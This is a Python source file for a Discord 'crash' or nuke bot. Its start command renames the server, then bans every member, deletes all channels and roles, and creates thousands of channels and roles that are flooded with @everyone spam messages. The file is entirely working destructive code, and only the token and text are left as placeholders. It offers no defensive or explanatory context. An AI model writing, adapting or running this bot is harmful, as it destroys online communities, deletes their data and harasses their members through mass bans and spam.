import discord
from discord.ext import commands
from asyncio import create_task


intents = discord.Intents.all()
intents.members = True
client = commands.Bot(command_prefix='YOUR PREFIX', intents=intents)
token = "YOUR TOKEN"


server_name = "YOUR TEXT"
message = "YOUR TEXT"
reason = "YOUR TEXT"
channels_name = "YOUR TEXT"
roles_name = "YOUR TEXT"


@client.event
async def on_ready():
    print_bot("Initialized.")


@client.event
async def on_guild_join(guild):
    print_bot(f"Invited to `{guild.name}`")


@commands.has_permissions(ban_members=True)
@client.command()
async def start(ctx):
    print_bot("Crash command executed!")
    await ctx.message.delete()

    with open('image.png') as image:
        await ctx.guild.edit(name=server_name, icon=image.read())

    create_task(ban_all(ctx))
    create_task(delete_channels(ctx))
    create_task(delete_roles(ctx))


async def delete_channels(ctx):
    for channels in ctx.guild.channels:
        try:
            await channels.delete(reason=reason)
            print_bot(f"`{channels.name}` Has been deleted.")
        except:
            print_bot(f"Unable to delete this channel `{channels.name}`")
            pass

    create_task(create_channels(ctx))


async def delete_roles(ctx):
    for role in ctx.guild.roles:
        try:
            await role.delete(reason=reason)
            print_bot(f"`{role.name}` Has been deleted.")
        except:
            print_bot(f"This role `{role.name}` cannot be deleted.")
            pass

    create_task(create_roles(ctx))


async def ban_all(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban(reason=reason)
            print_bot(f"`{member.name}` Has been banned.")
        except:
            print_bot(f"Can't ban this `{member.name}` member.")
            pass


async def create_channels(ctx):
    for channels in range(9999):
        try:
            channel = await ctx.guild.create_text_channel(channels_name)
            create_task(spam_messages(channel))
            print_bot("Channel has been created.")
        except:
            print_bot("Unable to create channel.")
            pass


async def create_roles(ctx):
    for roles in range(9999):
        try:
            await ctx.guild.create_role(name=roles_name)
            print_bot("Role created.")
        except:
            print_bot("Can't create role.")
            pass


async def spam_messages(channel):
    allowed_mentions = discord.AllowedMentions(everyone=True)
    for messages in range(9999):
        try:
            await channel.send(message, allowed_mentions=allowed_mentions)
            print_bot("Message sent.")
        except:
            print_bot("Unable to send message.")
            pass


def print_bot(text):
    print(f"[SELF CRASH BOT]: {text}")


client.run(token)
